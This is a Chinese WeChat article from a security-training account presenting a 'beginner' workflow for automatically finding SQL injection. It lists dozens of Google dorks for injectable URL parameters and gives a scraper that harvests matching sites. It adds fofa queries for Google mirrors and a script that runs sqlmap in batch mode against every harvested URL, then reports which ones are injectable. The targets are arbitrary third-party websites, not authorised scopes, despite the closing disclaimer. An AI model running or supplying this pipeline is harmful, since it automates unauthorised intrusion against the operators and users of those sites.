---
title: 小白SRC如何快速自动挖出第一个SQL注入漏洞
url: https://mp.weixin.qq.com/s/clOVoHiHPC6M7FiDX8mtIw
source: Doonsec's feed
date: 2026-09-18
fetch_date: 2026-09-19T06:58:25.220066
---

# 小白SRC如何快速自动挖出第一个SQL注入漏洞

# 小白SRC如何快速自动挖出第一个SQL注入漏洞

zkaq-17828147368
zkaq-17828147368

掌控安全EDU

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

扫码领资料

获网安教程

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrpvQG1VKMy1AQ1oVvUSeZYhLRYCeiaa3KSFkibg5xRjLlkwfIe7loMVfGuINInDQTVa4BibicW0iaTsKw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp#imgIndex=0)

![图片](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp#imgIndex=1)

# 本文由掌控安全学院 - **17828147368 投稿**

**来****Track安全社区投稿~**

**千元稿费！还有保底奖励~（  https://bbs.zkaq.cn   **）****

大佬勿喷，我就是一个脚本小子

通过谷歌爬取要进行sql注入的网站

## Google hack语法

```
inurl:/search_results.php search=
inurl:’Product.asp?BigClassName
inurl:Article_Print.asp?
inurl:NewsInfo.asp?id=
inurl:EnCompHonorBig.asp?id=
inurl:NewsInfo.asp?id=
inurl:ManageLogin.asp
inurl:Offer.php?idf=
inurl:Opinions.php?id=
inurl:Page.php?id=
inurl:Pop.php?id=
inurl:Post.php?id=
inurl:Prod_info.php?id=
inurl:Product-item.php?id=
inurl:Product.php?id=
inurl:Product_ranges_view.php?ID=
inurl:Productdetail.php?id=
inurl:Productinfo.php?id=
inurl:Produit.php?id=
inurl:Profile_view.php?id=
inurl:Publications.php?id=
inurl:Stray-Questions-View.php?num=
inurl:aboutbook.php?id=
inurl:ages.php?id=
inurl:announce.php?id=
inurl:art.php?idm=
inurl:article.php?ID=
inurl:asp?id=
inurl:avd_start.php?avd=
inurl:band_info.php?id=
inurl:buy.php?category=
inurl:category.php?id=
inurl:channel_id=
inurl:chappies.php?id=
inurl:clanek.php4?id=
inurl:clubpage.php?id=
inurl:collectionitem.php?id=
inurl:communique_detail.php?id=
inurl:curriculum.php?id=
inurl:declaration_more.php?decl_id=
inurl:detail.php?ID=
inurl:download.php?id=
inurl:downloads_info.php?id=
inurl:event.php?id=
inurl:faq2.php?id=
inurl:fellows.php?id=
inurl:fiche_spectacle.php?id=
inurl:forum_bds.php?num=
inurl:galeri_info.php?l=
inurl:gallery.php?id=
inurl:game.php?id=
inurl:games.php?id=
inurl:historialeer.php?num=
inurl:hosting_info.php?id=
inurl:humor.php?id=
```

## 谷歌爬取脚本

```
import requests
from lxml import etree
import time
def create_requests(page,data):
    url="https://www.google.com/search?q="+data+"&amp;lr=lang_zh-CN&amp;start={}".format(page)+"&amp;ie=utf-8"
    header={
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
    }
    response=requests.get(url=url,headers=header)#proxies=proxy
    response.encoding="utf-8"
    context=response.text
    return context
def parse_data(context):
    parse=etree.HTML(context)
    data=parse.xpath('//*/<span>@href')#CTL{n} </span>   f=open(r"url.txt","a")
    for url in data:
        if "/search?" in url:
            continue
        if "google.com" in url:
            continue
        if ".jpg" in url:
            continue
        if "jpeg" in url:
            continue
        if "png" in url:
            continue
        if "#" in url:
            continue
        if "%" in url:
            continue
        if "url=https://" in url:
            continue
        if "url=http://" in url:
            continue
        if ".pdf" in url:
            continue
        if ".htm" in url:
            continue
        if ".htmls" in url:
            continue
        if ".html" in url:
            continue
        if ".gov.cn" in url:
            continue
            break
        f.write(url+"\n")
        print(url+"成功写入")
    f.close()
if __name__ == '__main__':
    data = input("请输入Google语法:")
    print("----------------------开始抓取----------------------")
    for page in range(0,int(input("请输入结束页面的倍数:")),10):
        context=create_requests(page,data)
        parse_data(context)
    print("----------------------抓取完毕----------------------")
```

需要使用魔法，如果没有魔法还有一种方法，使用谷歌镜像站，通过fofa搜索

## fofa语法：

```
title="Google" && region="HK"
title=="Google" && server=="cloudflare"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ianpxKPnLHoLgNA8BviaibCrxcvM2pY3icRqottOXYQ3XiblXsJ2N8o7DrAkja4e3DQJ0YJqqDYiaUetNFnU4ZGdFTgyWUxUic5UFDqY9tYTqGygcw/640?wx_fmt=png&from=appmsg)

进入谷歌镜像站，输入谷歌hacking语法搜索

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ianpxKPnLHoItoeN9A75b7VHktUpGtOFYBT9cJ9tQ0fPhcMPElOHgpMPajc5QjHnbE3dWKicJAVQBU5WKOAY0fHiaSFiclJaWwwgf1PHVCDLL4Y/640?wx_fmt=png&from=appmsg)
上面的脚本把谷歌网址换成镜像站网址一样使用，然后保存以下脚本

```
import os
import shutil

def get_exists(path):
    sum = 0
    for root, dirs, files in os.walk(path, topdown=False):  # 使用topdown=False以便于删除目录
        log_path = os.path.join(root, "log")
        if os.path.isfile(log_path) and os.path.getsize(log_path) == 0:
            shutil.rmtree(root)
            dirs[:] = []  # 清空dirs列表，因为已经删除了当前目录
        else:
            sum += 1
            print(root + "\t注入成功")
    return sum

if __name__ == '__main__':
    path = r"result"
    print("--------------------开启执行--------------------")
    sum = get_exists(path)
    print(f"--------------------{sum}注入点--------------------")
```

调用上面的脚本去看一下sqlmap的日志文件，如果sqlmap成功发现注入点会有日志文件，日志文件不是空的，没有注入点，日志文件就为空
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ianpxKPnLHoIHf4sdmqSjoghPm27kReTCTfD06HXg01KwvNmDNEaBy7LmfjKzC9wn9Mmv18tAmJQstEiagtYkxec9bdPIJrfVuIz2GiaCz2xUU/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/ianpxKPnLHoICZicL076andYnIQg95xN5ldXJqPb851tn6nPCibUkmHXbciayib3XibGxeMjDnFU0VibXORibXvcS7hfkf7Ez3T8MMicsrMwhkgkX1Ks/640?wx_fmt=png&from=appmsg)
下面这个脚本就是全自动的，自动运行sqlmap和查看注入点，脚本运行完sqlmap就会自动调用下一个命令，最好和sqlmap在同一个文件夹

```
import subprocess

def run_commands(commands):
    for cmd in commands:
        try:
            print(f"Executing: {cmd}")
            subprocess.run(cmd, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print(f"An error occurred while executing {cmd}: {e}")
            break  # 发生错误时停止执行后续命令

if __name__ == "__main__":
    commands = [
        "python sqlmap.py -m url.txt --dbs --batch --level 3 --risk 2 --random-agent --output-dir result",
        "python 2.py"#这个改成你要查看注入点的脚本
    ]
    run_commands(commands)
```

申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，

所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

![图片](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=34)

**没看够~？欢迎关注！**

**分享本文到朋友圈，可以凭截图找老师领取**

上千**教程+工具+交流群+靶场账号**哦

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrpvQG1VKMy1AQ1oVvUSeZYhLRYCeiaa3KSFkibg5xRjLlkwfIe7loMVfGuINInDQTVa4BibicW0iaTsKw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp#imgIndex=35)

**分享后扫码加我！**

**回顾往期内容**

[网络安全人员必考的几本证书！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247520349&idx=1&sn=41b1bcd357e4178ba478e164ae531626&chksm=fa6be92ccd1c603af2d9100348600db5ed5a2284e82fd2b370e00b1138731b3cac5f83a3a542&scene=21#wechat_redirect)

[文库｜内网神器cs4.0使用说明书](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247519540&idx=1&sn=e8246a12895a32b4fc2909a0874faac2&chksm=fa6bf445cd1c7d53a207200289fe15a8518cd1eb0cc18535222ea01ac51c3e22706f63f20251&scene=21#wechat_redirect)

[重生HW之感谢客服小姐姐带我进入内网遨游](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247549901&idx=1&sn=f7c9c17858ce86edf5679149cce9ae9a&scene=21#wechat_redirect)

[手把手教你CNVD漏洞挖掘 + 资产收集](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247542576&idx=1&sn=d9f419d7a632390d52591ec0a5f4ba01&token=74838194&lang=zh_CN&scene=21#wechat_redirect)

[【精选】SRC快速入门+上分小秘籍+实战指南](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247512593&idx=1&sn=24c8e51745added4f81aa1e337fc8a1a&chksm=fa6bcb60cd1c4276d9d21ebaa7cb4c0c8c562e54fe8742c87e62343c00a1283c9eb3ea1c67dc&scene=21#wechat_redirect)

## [代理池工具撰写 | 只有无尽的跳转，没有封禁的IP！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503462&idx=1&sn=0b696f0cabab0a046385599a1683dfb2&chksm=fa6bb717cd1c3e01afc0d6126ea141bb9a39bf3b4123462528d37fb00f74ea525b83e948bc80&scene=21#wechat_redirect)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/...